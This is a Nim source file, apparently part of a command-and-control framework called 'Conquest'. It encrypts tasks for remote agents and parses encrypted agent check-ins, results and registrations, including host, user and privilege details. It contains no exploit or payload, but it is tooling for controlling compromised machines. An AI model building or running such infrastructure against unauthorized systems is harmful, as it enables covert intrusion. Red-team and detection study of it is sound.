import strutils, strformat, streams, times, tables
import ../utils
import ../../common/[types, utils, serialize, crypto]

proc serializeTask*(cq: Conquest, task: var Task): seq[byte] = 

    var packer = initPacker() 

    # Serialize payload
    packer
        .add(task.taskId)
        .add(task.listenerId)
        .add(task.timestamp)
        .add(task.command)
        .add(task.argCount)

    for arg in task.args:
        packer.addArgument(arg)

    let payload = packer.pack() 
    packer.reset()

    # Encrypt payload body
    let (encData, gmac) = encrypt(cq.agents[uuidToString(task.header.agentId)].sessionKey, task.header.iv, payload, task.header.seqNr)

    # Set authentication tag (GMAC)
    task.header.gmac = gmac

    # Serialize header 
    let header = packer.packHeader(task.header, uint32(payload.len))

    return header & encData

proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult = 

    var unpacker = initUnpacker(resultData.toString)

    let header = unpacker.unpackHeader()

    # Packet Validation
    if header.magic != MAGIC:
        raise newException(CatchableError, "Invalid magic bytes.")

    if header.packetType != cast[uint8](MSG_RESPONSE): 
        raise newException(CatchableError, "Invalid packet type for task result, expected MSG_RESPONSE.")

    # TODO: Validate sequence number 

    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size))

    let (decData, gmac) = decrypt(cq.agents[uuidToString(header.agentId)].sessionKey, header.iv, payload, header.seqNr)

    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
    if gmac != header.gmac:
        raise newException(CatchableError, "Invalid authentication tag (GMAC) for task result.")
    
    # Deserialize decrypted data
    unpacker = initUnpacker(decData.toString)

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
        status = unpacker.getUint8()
        resultType = unpacker.getUint8()
        length = unpacker.getUint32()
        data = unpacker.getBytes(int(length))

    return TaskResult(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        status: status,
        resultType: resultType,
        length: length,
        data: data
    )

proc deserializeNewAgent*(cq: Conquest, data: seq[byte]): Agent = 

    var unpacker = initUnpacker(data.toString)

    let header= unpacker.unpackHeader()

    # Packet Validation
    if header.magic != MAGIC: 
        raise newException(CatchableError, "Invalid magic bytes.")

    if header.packetType != cast[uint8](MSG_REGISTER): 
        raise newException(CatchableError, "Invalid packet type for agent registration, expected MSG_REGISTER.")

    # TODO: Validate sequence number 

    # Key exchange
    let agentPublicKey = unpacker.getKey()
    let sessionKey = deriveSessionKey(cq.keyPair, agentPublicKey)
    
    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size)) 
    let (decData, gmac) = decrypt(sessionKey, header.iv, payload, header.seqNr)

    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
    if gmac != header.gmac:
        raise newException(CatchableError, "Invalid authentication tag (GMAC) for agent registration.")

    # Deserialize decrypted data
    unpacker = initUnpacker(decData.toString)

    let 
        listenerId = unpacker.getUint32()
        username = unpacker.getVarLengthMetadata()
        hostname = unpacker.getVarLengthMetadata()
        domain = unpacker.getVarLengthMetadata()
        ip = unpacker.getVarLengthMetadata()
        os = unpacker.getVarLengthMetadata()
        process = unpacker.getVarLengthMetadata()
        pid = unpacker.getUint32() 
        isElevated = unpacker.getUint8()
        sleep = unpacker.getUint32()

    return Agent(
        agentId: uuidToString(header.agentId),
        listenerId: uuidToString(listenerId),
        username: username, 
        hostname: hostname,
        domain: domain,
        ip: ip,
        os: os,
        process: process,
        pid: int(pid),
        elevated: isElevated != 0,
        sleep: int(sleep),
        tasks: @[],  
        firstCheckin: now(),
        latestCheckin: now(),
        sessionKey: sessionKey
    )

proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat = 

    var unpacker = initUnpacker(data.toString)

    let header = unpacker.unpackHeader()

    # Packet Validation
    if header.magic != MAGIC: 
        raise newException(CatchableError, "Invalid magic bytes.")

    if header.packetType != cast[uint8](MSG_HEARTBEAT):
        raise newException(CatchableError, "Invalid packet type for checkin request, expected MSG_HEARTBEAT.")

    # TODO: Validate sequence number 

    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size))
    let (decData, gmac) = decrypt(cq.agents[uuidToString(header.agentId)].sessionKey, header.iv, payload, header.seqNr)

    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
    if gmac != header.gmac:
        raise newException(CatchableError, "Invalid authentication tag (GMAC) for heartbeat.")

    # Deserialize decrypted data
    unpacker = initUnpacker(decData.toString)

    return Heartbeat(
        header: header,
        listenerId: unpacker.getUint32(),
        timestamp: unpacker.getUint32()
    )